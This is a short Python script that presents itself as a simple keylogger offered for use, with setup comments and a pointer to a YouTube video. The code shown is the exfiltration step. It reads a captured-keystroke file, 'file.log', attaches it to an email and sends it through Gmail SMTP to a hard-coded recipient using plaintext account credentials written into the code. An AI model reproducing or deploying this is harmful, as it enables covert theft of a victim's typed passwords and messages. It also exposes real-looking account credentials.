#a simple keylogger for python by Sirius-Black4
#you need the smtplib for this to work
#do not use it if your upto no good
#check my Youtube video for more information on how to get it running


import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

#put your gmail id, password, sender address over here

email_user = 'yeonkim411@gmail.com'
email_password = 'toomuchmoney'
email_send = 'akikoishida411@gmail.com'
#put any subject you like
subject = 'Hello World'

#fill in the body of the email

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject
#put any body you like
body = 'Hello World'
msg.attach(MIMEText(body,'plain'))

#do not change the file name for the keylogger to work

#do not change anything from here to bottom

filename='file.log'
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_send,text)
server.quit()

